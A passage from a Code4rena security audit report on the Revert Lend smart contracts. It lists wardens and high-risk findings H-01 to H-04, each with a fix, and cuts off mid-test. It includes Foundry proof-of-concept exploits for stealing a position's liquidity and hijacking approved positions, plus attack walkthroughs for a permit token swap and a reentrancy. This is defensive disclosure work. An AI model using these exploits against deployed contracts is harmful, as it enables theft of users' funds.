---
sponsor: "Revert Lend"
slug: "2024-03-revert-lend"
date: "2024-05-22"
title: "Revert Lend"
findings: "https://github.com/code-423n4/2024-03-revert-lend-findings/issues"
contest: 342
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Revert Lend smart contract system written in Solidity. The audit took place between March 4 — March 15, 2024.

Following the C4 audit, 3 wardens ([b0g0](https://code4rena.com/@b0g0), [ktg](https://code4rena.com/@ktg) and [thank\_you](https://code4rena.com/@thank_you)) reviewed the mitigations for all identified issues; the [mitigation review report](#mitigation-review) is appended below the audit report.

## Wardens

105 Wardens contributed reports to the Revert Lend:

  1. [b0g0](https://code4rena.com/@b0g0)
  2. [0xjuan](https://code4rena.com/@0xjuan)
  3. [ktg](https://code4rena.com/@ktg)
  4. [thank\_you](https://code4rena.com/@thank_you)
  5. [Aymen0909](https://code4rena.com/@Aymen0909)
  6. [grearlake](https://code4rena.com/@grearlake)
  7. [cryptphi](https://code4rena.com/@cryptphi)
  8. [Giorgio](https://code4rena.com/@Giorgio)
  9. [lanrebayode77](https://code4rena.com/@lanrebayode77)
  10. [Bauchibred](https://code4rena.com/@Bauchibred)
  11. [falconhoof](https://code4rena.com/@falconhoof)
  12. [0xAlix2](https://code4rena.com/@0xAlix2) ([a\_kalout](https://code4rena.com/@a_kalout) and [ali\_shehab](https://code4rena.com/@ali_shehab))
  13. [santiellena](https://code4rena.com/@santiellena)
  14. [FastChecker](https://code4rena.com/@FastChecker)
  15. [Arz](https://code4rena.com/@Arz)
  16. [14si2o\_Flint](https://code4rena.com/@14si2o_Flint)
  17. [novamanbg](https://code4rena.com/@novamanbg)
  18. [kodyvim](https://code4rena.com/@kodyvim)
  19. [iamandreiski](https://code4rena.com/@iamandreiski)
  20. [JCN](https://code4rena.com/@JCN)
  21. [0xPhantom](https://code4rena.com/@0xPhantom)
  22. [kennedy1030](https://code4rena.com/@kennedy1030)
  23. [DanielArmstrong](https://code4rena.com/@DanielArmstrong)
  24. [KupiaSec](https://code4rena.com/@KupiaSec)
  25. [VAD37](https://code4rena.com/@VAD37)
  26. [yongskiws](https://code4rena.com/@yongskiws)
  27. [invitedtea](https://code4rena.com/@invitedtea)
  28. [popeye](https://code4rena.com/@popeye)
  29. [alix40](https://code4rena.com/@alix40)
  30. [Timenov](https://code4rena.com/@Timenov)
  31. [t4sk](https://code4rena.com/@t4sk)
  32. [CaeraDenoir](https://code4rena.com/@CaeraDenoir)
  33. [ayden](https://code4rena.com/@ayden)
  34. [ArsenLupin](https://code4rena.com/@ArsenLupin)
  35. [jesusrod15](https://code4rena.com/@jesusrod15)
  36. [Tigerfrake](https://code4rena.com/@Tigerfrake)
  37. [deepplus](https://code4rena.com/@deepplus)
  38. [Norah](https://code4rena.com/@Norah)
  39. [0x11singh99](https://code4rena.com/@0x11singh99)
  40. [CRYP70](https://code4rena.com/@CRYP70)
  41. [shaka](https://code4rena.com/@shaka)
  42. [SM3\_SS](https://code4rena.com/@SM3_SS)
  43. [dharma09](https://code4rena.com/@dharma09)
  44. [InAllHonesty](https://code4rena.com/@InAllHonesty)
  45. [atoko](https://code4rena.com/@atoko)
  46. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  47. [kfx](https://code4rena.com/@kfx)
  48. [linmiaomiao](https://code4rena.com/@linmiaomiao)
  49. [y0ng0p3](https://code4rena.com/@y0ng0p3)
  50. [0xspryon](https://code4rena.com/@0xspryon)
  51. [JecikPo](https://code4rena.com/@JecikPo)
  52. [SpicyMeatball](https://code4rena.com/@SpicyMeatball)
  53. [Topmark](https://code4rena.com/@Topmark)
  54. [befree3x](https://code4rena.com/@befree3x)
  55. [pynschon](https://code4rena.com/@pynschon)
  56. [Sathish9098](https://code4rena.com/@Sathish9098)
  57. [K42](https://code4rena.com/@K42)
  58. [0xk3y](https://code4rena.com/@0xk3y)
  59. [Mike\_Bello90](https://code4rena.com/@Mike_Bello90)
  60. [Myd](https://code4rena.com/@Myd)
  61. [th3l1ghtd3m0n](https://code4rena.com/@th3l1ghtd3m0n)
  62. [lightoasis](https://code4rena.com/@lightoasis)
  63. [JohnSmith](https://code4rena.com/@JohnSmith)
  64. [jnforja](https://code4rena.com/@jnforja)
  65. [btk](https://code4rena.com/@btk)
  66. [MohammedRizwan](https://code4rena.com/@MohammedRizwan)
  67. [BowTiedOriole](https://code4rena.com/@BowTiedOriole)
  68. [SAQ](https://code4rena.com/@SAQ)
  69. [0xAnah](https://code4rena.com/@0xAnah)
  70. [0xhacksmithh](https://code4rena.com/@0xhacksmithh)
  71. [wangxx2026](https://code4rena.com/@wangxx2026)
  72. [0x175](https://code4rena.com/@0x175)
  73. [Arabadzhiev](https://code4rena.com/@Arabadzhiev)
  74. [zaevlad](https://code4rena.com/@zaevlad)
  75. [Bigsam](https://code4rena.com/@Bigsam)
  76. [adeolu](https://code4rena.com/@adeolu)
  77. [tpiliposian](https://code4rena.com/@tpiliposian)
  78. [crypticdefense](https://code4rena.com/@crypticdefense)
  79. [givn](https://code4rena.com/@givn)
  80. [0xDemon](https://code4rena.com/@0xDemon)
  81. [Silvermist](https://code4rena.com/@Silvermist)
  82. [Limbooo](https://code4rena.com/@Limbooo)
  83. [erosjohn](https://code4rena.com/@erosjohn)
  84. [kinda\_very\_good](https://code4rena.com/@kinda_very_good)
  85. [nmirchev8](https://code4rena.com/@nmirchev8)
  86. [stackachu](https://code4rena.com/@stackachu)
  87. [Ocean\_Sky](https://code4rena.com/@Ocean_Sky)
  88. [0xloscar01](https://code4rena.com/@0xloscar01)
  89. [Ali-\_-Y](https://code4rena.com/@Ali-_-Y)
  90. [0rpse](https://code4rena.com/@0rpse)
  91. [0xBugSlayer](https://code4rena.com/@0xBugSlayer)
  92. [nnez](https://code4rena.com/@nnez)
  93. [0xblackskull](https://code4rena.com/@0xblackskull)
  94. [Fitro](https://code4rena.com/@Fitro)
  95. [0xGreyWolf](https://code4rena.com/@0xGreyWolf)
  96. [stonejiajia](https://code4rena.com/@stonejiajia)
  97. [n1punp](https://code4rena.com/@n1punp)
  98. [MSaptarshi](https://code4rena.com/@MSaptarshi)
  99. [boredpukar](https://code4rena.com/@boredpukar)
  100. [maxim371](https://code4rena.com/@maxim371)
  101. [zxriptor](https://code4rena.com/@zxriptor)
  102. [AMOW](https://code4rena.com/@AMOW)
  103. [alexander\_orjustalex](https://code4rena.com/@alexander_orjustalex)
  104. [web3Tycoon](https://code4rena.com/@web3Tycoon)

This audit was judged by [ronnyx2017](https://code4rena.com/@ronnyx2017).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 31 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 27 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 43 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 7 reports recommending gas optimizations.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Revert Lend repository](https://github.com/code-423n4/2024-03-revert-lend), and is composed of 11 smart contracts written in the Solidity programming language and includes 3214 lines of Solidity code.

In addition to the known issues identified by the project team, a Code4rena bot race was conducted at the start of the audit. The winning bot, **Hound** from warden DadeKuma, generated the [Automated Findings report](https://github.com/code-423n4/2024-03-revert-lend/blob/main/bot-report.md) and all findings therein were classified as out of scope.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (6)
## [[H-01] `V3Vault.sol` permit signature does not check receiving token address is USDC](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/368)
*Submitted by [VAD37](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/368), also found by thank\_you ([1](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/433), [2](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/432), [3](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/431)), [santiellena](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/388), [ArsenLupin](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/299), [jesusrod15](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/162), and [ayden](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/23)*

In `V3Vault.sol` there all 3 instances of `permit2.permitTransferFrom()`, all 3 does not check token transfered in is USDC token.
Allowing user to craft permit signature from any ERC20 token and Vault will accept it as USDC.

### Impact

User can steal all USDC from vault using permit signature of any ERC20 token.

### Proof of Concept

Here is how Vault accept USDC from user. Vault will accept `Uniswap.Permit2` signature transfer allowance from Permit2 then to vault contract.

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L877C1-L917C6>

```solidity
    if (params.permitData.length > 0) {
        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
            abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
        permit2.permitTransferFrom(
            permit,
            ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),
            msg.sender,
            signature
        );
    } else {
        // take value from liquidator
        SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);
    }
```

Below is permit signature struct that can be decoded from user provided data:

```solidity
interface ISignatureTransfer is IEIP712 {
    /// @notice The token and amount details for a transfer signed in the permit transfer signature
    struct TokenPermissions {
        // ERC20 token address
        address token;
        // the maximum amount that can be spent
        uint256 amount;
    }

    /// @notice The signed permit message for a single token transfer
    struct PermitTransferFrom {
        TokenPermissions permitted;
        // a unique value for every token owner's signature to prevent signature replays
        uint256 nonce;
        // deadline on the permit signature
        uint256 deadline;
    }
}
```

`V3Vault.sol` needs to check `TokenPermissions.token` is USDC, same as vault main asset.

`Uniswap.permit2.permitTransferFrom()` only checks if the sign signature is correct. This is meaningless as Vault does not validate input data.

This allows users to use any ERC20 token, gives allowance and permits to `Uniswap.Permit2`. The Vault will accept any transfer token from `Permit2` as USDC. Allowing users to deposit any ERC20 token and steal USDC from vault.

### Recommended Mitigation Steps

Fix missing user input validations in 3 all instances of `permit2`:

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L717C1-L725C15><br>
<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L893C1-L898C15><br>
<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L877C1-L917C6>

```solidity
    if (params.permitData.length > 0) {
        (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
            abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
        require(permit.permitted.token == asset, "V3Vault: invalid token");
        //@permitted amount is checked inside uniswap Permit2
        permit2.permitTransferFrom(
            permit,
            ISignatureTransfer.SignatureTransferDetails(address(this), state.liquidatorCost),
            msg.sender,
            signature
        );
    } else {
        // take value from liquidator
        SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), state.liquidatorCost);
    }
```

### Assessed type

ERC20

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/368#issuecomment-2021029140)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/19) - checks token in permit.

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/76), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/9) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/7).

***

## [[H-02] Risk of reentrancy `onERC721Received` function to manipulate collateral token configs shares](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/323)
*Submitted by [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/323), also found by [b0g0](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/309)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L454-L473><br>
<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1223-L1241>

### Issue Description

The `onERC721Received` function is invoked whenever the vault contract receives a Uniswap V3 position ERC721 token. This can happen either when an owner creates a new position or when a transformation occurs.

For this issue, we'll focus on the second case, specifically when a position is going through a transformation, which creates a new position token. In such a case, we have `tokenId != oldTokenId`, and the else block is run, as shown below:

```solidity
function onERC721Received(address, address from, uint256 tokenId, bytes calldata data)
    external
    override
    returns (bytes4)
{
    ...

    if {
        ...
    } else {
        uint256 oldTokenId = transformedTokenId;

        // if in transform mode - and a new position is sent - current position is replaced and returned
        if (tokenId != oldTokenId) {
            address owner = tokenOwner[oldTokenId];

            // set transformed token to new one
            transformedTokenId = tokenId;

            // copy debt to new token
            loans[tokenId] = Loan(loans[oldTokenId].debtShares);

            _addTokenToOwner(owner, tokenId);
            emit Add(tokenId, owner, oldTokenId);

            // clears data of old loan
            _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);

            //@audit can reenter with onERC721Received and call repay or borrow to call _updateAndCheckCollateral twice and manipulate collateral token configs

            // sets data of new loan
            _updateAndCheckCollateral(
                tokenId, debtExchangeRateX96, lendExchangeRateX96, 0, loans[tokenId].debtShares
            );
        }
    }

    return IERC721Receiver.onERC721Received.selector;
}
```

We should note that the `_cleanupLoan` function does return the old position token to the owner:

```solidity
function _cleanupLoan(
    uint256 tokenId,
    uint256 debtExchangeRateX96,
    uint256 lendExchangeRateX96,
    address owner
) internal {
    _removeTokenFromOwner(owner, tokenId);
    _updateAndCheckCollateral(
        tokenId,
        debtExchangeRateX96,
        lendExchangeRateX96,
        loans[tokenId].debtShares,
        0
    );
    delete loans[tokenId];
    nonfungiblePositionManager.safeTransferFrom(
        address(this),
        owner,
        tokenId
    );
    emit Remove(tokenId, owner);
}
```

The issue that can occur is that the `_cleanupLoan` is invoked before the `_updateAndCheckCollateral` call. So, a malicious owner can use the `onERC721Received` callback when receiving the old token to call the `borrow` function, which makes changes to `loans[tokenId].debtShares` and calls `_updateAndCheckCollateral`. When the call resumes, the `V3Vault.onERC721Received` function will call `_updateAndCheckCollateral` again, resulting in incorrect accounting of internal token configs debt shares (`tokenConfigs[token0].totalDebtShares` & `tokenConfigs[token1].totalDebtShares`) and potentially impacting the vault borrowing process negatively.

### Proof of Concept

Let's use the following scenario to demonstrate the issue:

Before starting, we suppose the following states:

- `tokenConfigs[token0].totalDebtShares = 10000`
- `tokenConfigs[token1].totalDebtShares = 15000`

1. Bob has previously deposited a UniswapV3 position (which uses `token0` and `token1`) with `tokenId = 12` and borrowed `loans[tokenId = 12].debtShares = 1000` debt shares.

2. Bob calls the `transform` function to change the range of his position using the AutoRange transformer, which mints a new ERC721 token `tokenId = 20` for the newly arranged position and sends it to the vault.

3. Upon receiving the new token, the `V3Vault.onERC721Received` function is triggered. As we're in transformation mode and the token ID is different, the second else block above will be executed.

4. `V3Vault.onERC721Received` will copy loan debt shares to the new token, so we'll have `loans[tokenId = 20].debtShares = 1000`.

5. Then `V3Vault.onERC721Received` will invoke the `_cleanupLoan` function to clear the data of the old loan and transfer the old position token `tokenId = 12` back to Bob.

    - 5.1. `_cleanupLoan` will also call `_updateAndCheckCollateral` function to change `oldShares = 1000 --> newShares = 0` (remove old token shares), resulting in:

        - `tokenConfigs[token0].totalDebtShares = 10000 - 1000 = 9000`.
        - `tokenConfigs[token1].totalDebtShares = 15000 - 1000 = 14000`.

6.  Bob, upon receiving the old position token, will also use the ERC721 `onERC721Received` callback to call the `borrow` function. He will borrow 200 debt shares against his new position token `tokenId = 20`.

    - 6.1. The `borrow` function will update the token debt shares from `loans[tokenId = 20].debtShares = 1000` to: `loans[tokenId = 20].debtShares = 1000 + 200 = 1200` (assuming the position is healthy).

    - 6.2. The `borrow` function will also invoke the `_updateAndCheckCollateral` function to change `oldShares = 1000 --> newShares = 1200` for `tokenId = 20`, resulting in:

        - `tokenConfigs[token0].totalDebtShares = 9000 + 200 = 9200`.
        - `tokenConfigs[token1].totalDebtShares = 14000 + 200 = 14200`.

7.  Bob's borrow call ends, and the `V3Vault.onERC721Received` call resumes. `_updateAndCheckCollateral` gets called again, changing `oldShares = 0 --> newShares = 1200` (as the borrow call changed the token debt shares), resulting in:

    - `tokenConfigs[token0].totalDebtShares = 9200 + 1200 = 10400`.
    - `tokenConfigs[token1].totalDebtShares = 14200 + 1200 = 15400`.

Now, let's assess what Bob managed to achieve by taking a normal/honest transformation process (without using the `onERC721Received` callback) and then a borrow operation scenario:

- Normally, when `V3Vault.onERC721Received` is called, it shouldn't change the internal token configs debt shares (`tokenConfigs[token0].totalDebtShares` & `tokenConfigs[token1].totalDebtShares`). After a normal `V3Vault.onERC721Received`, we should still have:

    - `tokenConfigs[token0].totalDebtShares = 10000`.
    - `tokenConfigs[token1].totalDebtShares = 15000`.

- Then, when Bob borrows 200 debt shares against the new token, we should get:

    - `tokenConfigs[token0].totalDebtShares = 10000 + 200 = 10200`.
    - `tokenConfigs[token1].totalDebtShares = 15000 + 200 = 15200`.

We observe that by using the `onERC721Received` callback, Bob managed to increase the internal token configs debt shares (`tokenConfigs[token0].totalDebtShares` & `tokenConfigs[token1].totalDebtShares`) by 200 debt shares more than expected.

This means that Bob, by using this attack, has manipulated the internal token configs debt shares, making the vault believe it has 200 additional debt shares. Bob can repeat this attack multiple times until he approaches the limit represented by `collateralValueLimitFactorX32` and `collateralValueLimitFactorX32` multiplied by the amount of asset lent as shown below:

```solidity
uint256 lentAssets = _convertToAssets(
    totalSupply(),
    lendExchangeRateX96,
    Math.Rounding.Up
);
uint256 collateralValueLimitFactorX32 = tokenConfigs[token0]
    .collateralValueLimitFactorX32;
if (
    collateralValueLimitFactorX32 < type(uint32).max &&
    _convertToAssets(
        tokenConfigs[token0].totalDebtShares,
        debtExchangeRateX96,
        Math.Rounding.Up
    ) >
    (lentAssets * collateralValueLimitFactorX32) / Q32
) {
    revert CollateralValueLimit();
}
collateralValueLimitFactorX32 = tokenConfigs[token1]
    .collateralValueLimitFactorX32;
if (
    collateralValueLimitFactorX32 < type(uint32).max &&
    _convertToAssets(
        tokenConfigs[token1].totalDebtShares,
        debtExchangeRateX96,
        Math.Rounding.Up
    ) >
    (lentAssets * collateralValueLimitFactorX32) / Q32
) {
    revert CollateralValueLimit();
}
```

Then, when other borrowers try to call the `borrow` function, it will revert because `_updateAndCheckCollateral` will trigger the `CollateralValueLimit` error, thinking there is too much debt already. However, this is not the case, as the internal token configs debt shares have been manipulated (increased) by an attacker (Bob).

This attack is irreversible because there is no way to correct the internal token configs debt shares (`tokenConfigs[token0].totalDebtShares` & `tokenConfigs[token1].totalDebtShares`), and the vault will remain in that state, not allowing users to borrow, resulting in no interest being accrued and leading to financial losses for the lenders and the protocol.

### Impact

A malicious attacker could use the AutoRange transformation process to manipulate the internal token configs debt shares, potentially resulting in:

- Fewer loans being allowed by the vault than expected.
- A complete denial-of-service (DOS) for all borrow operations.

### Tools Used

VS Code

### Recommended Mitigation

The simplest way to address this issue is to ensure that the `onERC721Received` function follows the Correctness by Construction (CEI) pattern, as follows:

```diff
function onERC721Received(address, address from, uint256 tokenId, bytes calldata data)
    external
    override
    returns (bytes4)
{
    ...

    if {
        ...
    } else {
        uint256 oldTokenId = transformedTokenId;

        // if in transform mode - and a new position is sent - current position is replaced and returned
        if (tokenId != oldTokenId) {
            address owner = tokenOwner[oldTokenId];

            // set transformed token to new one
            transformedTokenId = tokenId;

            // copy debt to new token
            loans[tokenId] = Loan(loans[oldTokenId].debtShares);

            _addTokenToOwner(owner, tokenId);
            emit Add(tokenId, owner, oldTokenId);

--          // clears data of old loan
--          _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);

            // sets data of new loan
            _updateAndCheckCollateral(
                tokenId, debtExchangeRateX96, lendExchangeRateX96, 0, loans[tokenId].debtShares
            );

++          // clears data of old loan
++          _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);
        }
    }

    return IERC721Receiver.onERC721Received.selector;
}
```

### Assessed type

Context

**[kalinbas (Revert) confirmed via duplicate Issue #309](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/309#issuecomment-2020917444):**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PRs [here](https://github.com/revert-finance/lend/pull/8) and [here](https://github.com/revert-finance/lend/pull/32) - removed sending of NFT to avoid reentrancy.

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/77), [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/44) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/14).

***

## [[H-03] `V3Vault::transform` does not validate the `data` input and allows a depositor to exploit any position approved on the transformer](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/214)
*Submitted by [b0g0](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/214)*

Any account holding a position inside `V3Vault` can transform any NFT position outside the vault that has been delegated to Revert operators for transformation (`AutoRange`, `AutoCompound` and all other transformers that manage positions outside of the vault).

The exploiter can pass any `params` at any time, affecting positions they do not own and their funds critically.

### Vulnerability details

In order to borrow from `V3Vault`, an account must first create a collateralized position by sending his position NFT through the [`create()` function](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L400C14-L400C20)

Any account that has a position inside the vault can use the `transform()` function to manage the NFT, while it is owned by the vault:

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497>

```
  function transform(uint256 tokenId, address transformer, bytes calldata data)
        external
        override
        returns (uint256 newTokenId)
    {
        ....
        //@audit -> tokenId inside data not checked

        (uint256 newDebtExchangeRateX96,) = _updateGlobalInterest();

        address loanOwner = tokenOwner[tokenId];

        // only the owner of the loan, the vault itself or any approved caller can call this
        if (loanOwner != msg.sender && !transformApprovals[loanOwner][tokenId][msg.sender]) {
            revert Unauthorized();
        }

        // give access to transformer
        nonfungiblePositionManager.approve(transformer, tokenId);

        (bool success,) = transformer.call(data);
        if (!success) {
            revert TransformFailed();
        }

        ....

        // check owner not changed (NEEDED because token could have been moved somewhere else in the meantime)
        address owner = nonfungiblePositionManager.ownerOf(tokenId);
        if (owner != address(this)) {
            revert Unauthorized();
        }

        ....

        return tokenId;
    }
```

The user passes an approved transformer address and the calldata to execute on it. The problem here is that the function only validates the ownership of the `uint256 tokenId` input parameter. However, it never checks if the `tokenId` encoded inside `bytes calldata data` parameter belongs to `msg.sender`.

This allows any vault position holder to **call an allowed transformer with arbitrary params encoded as calldata and change any position delegated to that transformer**.

This will impact all current and future transformers that manage Vault positions. To prove the exploit, I'm providing a coded POC using the [`AutoCompound` transformer](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/transformers/AutoCompound.sol#L16).

### Proof of Concept

A short explanation of the POC:

- `Alice` is an account outside the vault that approves her position `ALICE_NFT` to be auto-compounded by Revert controlled operators (bots).
- `Bob` decides to act maliciously and transform `Alice` position.
- `Bob` opens a position in the vault with his `BOB_NFT` so that he can call `transform()`.
- `Bob` calls `V3Vault.transform()` with `BOB_NFT` as `tokenId` param to pass validation but encodes `ALICE_NFT` inside data.
- `Bob` successfully transforms `Alice` position with his params.

You can add the following test to `V3Vault.t.sol` and run `forge test --contracts /test/V3Vault.t.sol --mt testTransformExploit -vvvv`.

```solidity
function testTransformExploit() external {
        // Alice
        address ALICE_ACCOUNT = TEST_NFT_ACCOUNT;
        uint256 ALICE_NFT = TEST_NFT;

        // Malicious user
        address EXPLOITER_ACCOUNT = TEST_NFT_ACCOUNT_2;
        uint256 EXPLOITER_NFT = TEST_NFT_2;

        // Set up an auto-compound transformer
        AutoCompound autoCompound = new AutoCompound(
            NPM,
            WHALE_ACCOUNT,
            WHALE_ACCOUNT,
            60,
            100
        );
        vault.setTransformer(address(autoCompound), true);
        autoCompound.setVault(address(vault), true);

        // Set fee to 2%
        uint256 Q64 = 2 ** 64;
        autoCompound.setReward(uint64(Q64 / 50));

        // Alice decides to delegate her position to
        // Revert bots (outside of vault) to be auto-compounded
        vm.prank(ALICE_ACCOUNT);
        NPM.approve(address(autoCompound), ALICE_NFT);

        // Exploiter opens a position in the Vault
        vm.startPrank(EXPLOITER_ACCOUNT);
        NPM.approve(address(vault), EXPLOITER_NFT);
        vault.create(EXPLOITER_NFT, EXPLOITER_ACCOUNT);
        vm.stopPrank();

        // Exploiter passes ALICE_NFT as param
        AutoCompound.ExecuteParams memory params = AutoCompound.ExecuteParams(
            ALICE_NFT,
            false,
            0
        );

        // Exploiter account uses his own token to pass validation
        // but transforms Alice position
        vm.prank(EXPLOITER_ACCOUNT);
        vault.transform(
            EXPLOITER_NFT,
            address(autoCompound),
            abi.encodeWithSelector(AutoCompound.execute.selector, params)
        );
    }
```

Since the exploiter can control the calldata send to the transformer, he can impact any approved position in various ways. In the case of `AutoCompound` it can be:

- Draining the position funds - `AutoCompound` collects a fee on every transformation. The exploiter can call it multiple times.
- Manipulating `swap0To1` & `amountIn` parameters to execute swaps in unfavourable market conditions, leading to loss of funds or value extraction.

Those are only a couple of ideas. The impact can be quite severe depending on the transformer and parameters passed.

### Tools Used

Foundry

### Recommended Mitigation Steps

Consider adding a check inside `transform()` to make sure the provided `tokenId` and the one encoded as calldata are the same. This way the caller will not be able to manipulate other accounts positions.

### Assessed type

Invalid Validation

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/214#issuecomment-2020814460)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> PR [here](https://github.com/revert-finance/lend/pull/29) - refactoring to make all transformers properly check caller permission.

**Status:** Mitigation confirmed. Full details in reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/8), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/78) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/19).

***

## [[H-04] `V3Utils.execute()` does not have caller validation, leading to stolen NFT positions from users](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/141)
*Submitted by [0xjuan](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/141), also found by [CaeraDenoir](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/445), [santiellena](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/390), [Tigerfrake](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/103), [Timenov](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/77), and [novamanbg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/35)*

When a user wants to use `V3Utils`, one of the flows stated by the protocol is as follows:

- TX1: User calls `NPM.approve(V3Utils, tokenId)`.
- TX2: User calls `V3Utils.execute()` with specific instructions.

> Note that this can't be done in one transaction since in TX1, the NPM has to be called directly by the EOA which owns the NFT. Thus, the `V3Utils.execute()` would have to be called in a subsequent transaction.

Now this is usually a safe design pattern, but the issue is that `V3Utils.execute()` does not validate the owner of the UniV3 Position NFT that is being handled. This allows anybody to provide arbitrary instructions and call `V3Utils.execute()` once the NFT has been approved in TX1.

A malicious actor provide instructions that include the following:

1. `WhatToDo = WITHDRAW_AND_COLLECT_AND_SWAP`.
2. `recipient = malicious_actor_address`.
3. `liquidity = total_position_liquidity`.

This would collect all liquidity from the position that was approved, and send it to the malicious attacker who didn't own the position.

### Impact

The entire liquidity of a specific UniswapV3 liquidity provision NFT can be stolen by a malicious actor, with zero cost.

### Proof of Concept

This foundry test demonstrates how an attacker can steal all the liquidity from a UniswapV3 position NFT that is approved to the V3Utils contract.

To run the PoC:

1. Add the following foundry test to `test/integration/V3Utils.t.sol`.
2. Run the command `forge test --via-ir --mt test_backRunApprovals_toStealAllFunds -vv` in the terminal.

```solidity
function test_backRunApprovals_toStealAllFunds() external {
    address attacker = makeAddr("attacker");

    uint256 daiBefore = DAI.balanceOf(attacker);
    uint256 usdcBefore = USDC.balanceOf(attacker);
    (,,,,,,, uint128 liquidityBefore,,,,) = NPM.positions(TEST_NFT_3);

    console.log("Attacker's DAI Balance Before: %e", daiBefore);
    console.log("Attacker's USDC Balance Before: %e", usdcBefore);
    console.log("Position #%s's liquidity Before: %e", TEST_NFT_3, liquidityBefore);

    // Malicious instructions used by attacker:
    V3Utils.Instructions memory bad_inst = V3Utils.Instructions(
        V3Utils.WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,
        address(USDC), 0, 0, 0, 0, "", 0, 0, "", type(uint128).max, type(uint128).max, 0, 0, 0,
        liquidityBefore, // Attacker chooses to withdraw 100% of the position's liquidity
        0,
        0,
        block.timestamp,
        attacker, // Recipient address of tokens
        address(0),
        false,
        "",
        ""
    );

    // User approves V3Utils, planning to execute next
    vm.prank(TEST_NFT_3_ACCOUNT);
    NPM.approve(address(v3utils), TEST_NFT_3);
    
    console.log("\n--ATTACK OCCURS--\n");
    // User's approval gets back-ran
    vm.prank(attacker);
    v3utils.execute(TEST_NFT_3, bad_inst);
    
    uint256 daiAfter = DAI.balanceOf(attacker);
